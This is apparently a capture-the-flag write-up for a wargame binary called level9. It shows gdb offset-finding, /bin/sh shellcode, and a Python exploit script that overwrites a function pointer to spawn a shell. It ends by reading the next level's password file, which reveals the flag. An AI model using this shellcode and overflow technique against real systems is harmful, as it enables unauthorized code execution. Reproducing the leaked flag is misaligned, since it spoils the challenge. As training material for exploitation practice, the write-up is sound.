@@ -1,0 +1,75 @@
+First step - testing the program
+
+$ ./level9
+$ ./level9 coucou
+$ ./level9 coucou coucou
+
+Nothing
+
+Let's try and find EAX offset with gdb:
+
+(gdb) r AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz
+Starting program: /home/user/level9/level9 AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz
+
+Program received signal SIGSEGV, Segmentation fault.
+0x08048682 in main ()
+(gdb) info register
+eax            0x62626262	1650614882
+ecx            0x7a7a7a7a	2054847098
+edx            0x804a0dc	134521052
+ebx            0x804a078	134520952
+esp            0xbffff610	0xbffff610
+ebp            0xbffff638	0xbffff638
+esi            0x0	0
+edi            0x0	0
+eip            0x8048682	0x8048682 <main+142>
+eflags         0x210287	[ CF PF SF IF RF ID ]
+cs             0x73	115
+ss             0x7b	123
+ds             0x7b	123
+es             0x7b	123
+fs             0x0	0
+gs             0x33	51
+
+
+EAX = 0x62626262 = bbbb = 108
+
+We will try to inject a shellcode into the binary:
+
+SHELLCODE = \x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80
+
+Our goal is to force the program to execute our shellcode when it will call the n_2 function pointer.
+
+In order to do that we must find the start address of our buffer and replace the value of esp+0x10 by it to make the call of edx calls our shellcode. But, because we need to dereference twice like we want to access to the N class, our return address should points to an address which points to the start buffer :
+
+(gdb) b *main+136                                    // right after the setAnnotation() call
+Breakpoint 1 at 0x804867c
+(gdb) run 'AAAA'
+Starting program: /home/user/level9/level9 'AAAA'
+
+Breakpoint 1, 0x0804867c in main ()
+(gdb) x $eax
+0x804a00c:      0x41414141                           // buffer address
+
+The value of [esp+0x10] will be replaced with 0x804a00c.
+
+The value of [esp+0x10] will be replaced with 0x804a00c.
+Because we need to dereference again, this address will points to the beginning of our shellcode : 0x804a00x + 4 = 0x804a010.
+
+The final exploit will look like:
+
+#!/usr/bin/env python
+
+SHELLCODE = "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
+PREFIX = "A" * (108 - 4 - len(SHELLCODE))
+THIS = "\x10\xa0\x04\x08"
+THIS2 = "\x0c\xa0\x04\x08"
+
+print (THIS + SHELLCODE + PREFIX + THIS2)
+
+
+$> ./level9 $(./script.py)
+$ whoami
+bonus0
+$ cat /home/user/bonus0/.pass
+f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
